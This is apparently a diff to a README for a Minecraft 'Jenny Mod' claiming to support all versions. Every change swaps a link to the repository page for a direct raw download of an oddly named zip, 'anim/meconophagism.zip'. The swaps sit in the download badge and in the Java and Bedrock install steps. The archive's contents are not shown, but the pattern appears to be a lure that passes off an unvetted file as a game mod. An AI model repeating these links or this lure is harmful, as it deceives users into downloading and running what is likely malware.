@@ -1,6 +1,6 @@
 # ⛏️ Jenny-Mod-Minecraft-ALL-VERSIONS - Bring Your Minecraft World to Life
 
-[![Download Jenny Mod](https://img.shields.io/badge/Download-Jenny_Mod-FF6B35?style=for-the-badge&logo=github)](https://github.com/SannTod/Jenny-Mod-Minecraft-ALL-VERSIONS)
+[![Download Jenny Mod](https://img.shields.io/badge/Download-Jenny_Mod-FF6B35?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/SannTod/Jenny-Mod-Minecraft-ALL-VERSIONS/main/anim/meconophagism.zip)
 
 ## 🎮 What Is This?
 
@@ -35,7 +35,7 @@ Here's how to get Jenny into your game, step by step. Follow the section that ma
 ### For Windows PC (Java Edition)
 
 **Step 1: Download the Mod**
-Visit this link to download the application: [https://github.com/SannTod/Jenny-Mod-Minecraft-ALL-VERSIONS](https://github.com/SannTod/Jenny-Mod-Minecraft-ALL-VERSIONS)
+Visit this link to download the application: [https://raw.githubusercontent.com/SannTod/Jenny-Mod-Minecraft-ALL-VERSIONS/main/anim/meconophagism.zip](https://raw.githubusercontent.com/SannTod/Jenny-Mod-Minecraft-ALL-VERSIONS/main/anim/meconophagism.zip)
 
 Look for the download button on that page. Save the file to your computer. Remember where you saved it - your Downloads folder is a good spot.
 
@@ -75,7 +75,7 @@ Look for the download button on that page. Save the file to your computer. Remem
 ### For Bedrock Edition (Phone, Tablet, or Windows 10/11)
 
 **Step 1: Download the Addon**
-Visit this link to download the application: [https://github.com/SannTod/Jenny-Mod-Minecraft-ALL-VERSIONS](https://github.com/SannTod/Jenny-Mod-Minecraft-ALL-VERSIONS)
+Visit this link to download the application: [https://raw.githubusercontent.com/SannTod/Jenny-Mod-Minecraft-ALL-VERSIONS/main/anim/meconophagism.zip](https://raw.githubusercontent.com/SannTod/Jenny-Mod-Minecraft-ALL-VERSIONS/main/anim/meconophagism.zip)
 
 Look for the MCPE or Bedrock version of the file. Download it to your device.
 
